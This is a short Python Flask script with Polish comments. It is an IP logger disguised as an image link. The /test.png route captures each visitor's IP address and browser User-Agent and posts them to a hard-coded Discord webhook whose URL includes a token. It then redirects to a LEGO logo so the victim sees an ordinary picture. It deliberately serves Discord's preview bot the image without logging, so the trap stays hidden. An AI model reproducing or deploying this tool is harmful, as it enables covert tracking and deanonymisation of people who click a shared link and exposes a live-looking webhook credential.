from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# TWÓJ WEBHOOK
WEBHOOK_URL = "https://discord.com/api/webhooks/1336930594799327529/VX0R1leJbv97emxJkz3rKjLKgr5BK6SgoSqcCn_cRc76VepZoxiEpPk3fcTPqgVYlyBi"

@app.route('/test.png')
def logger():
    # Pobieramy dane
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', 'Unknown')
    
    # Ignoruj bota Discorda (żeby nie było spamu)
    if "Discordbot" in ua:
        return redirect("https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png")

    # Próba wysłania na Webhook (prosty tekst, mniejsza szansa na blokadę)
    try:
        msg = f"🔔 **LOG!**\n**IP:** `{ip}`\n**Browser:** `{ua[:50]}`"
        requests.post(WEBHOOK_URL, json={"content": msg}, timeout=5)
    except Exception as e:
        print(f"Blad: {e}")

    # Przekierowanie do PRAWDZIWEGO zdjęcia LEGO (to na 100% działa)
    return redirect("https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png")

if __name__ == '__main__':
    app.run(port=10000)
